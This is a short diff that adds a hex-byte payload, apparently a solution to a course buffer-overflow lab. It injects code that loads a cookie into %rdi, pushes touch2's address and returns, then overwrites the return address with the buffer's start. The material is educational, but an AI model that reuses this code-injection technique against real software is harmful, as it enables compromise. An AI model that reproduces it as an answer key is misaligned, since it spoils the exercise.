@@ -1,0 +1,17 @@
+/* fill the array */
+48 c7 c7 /* write to %rdi */
+fa 97 b9 59 /* the address of cookie */
+68 ec 17 40 /* pushq the address of touch2 */
+00 c3 00 00 /* ret */
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00
+
+
+78 dc 61 55 /* the start of array */
+
+
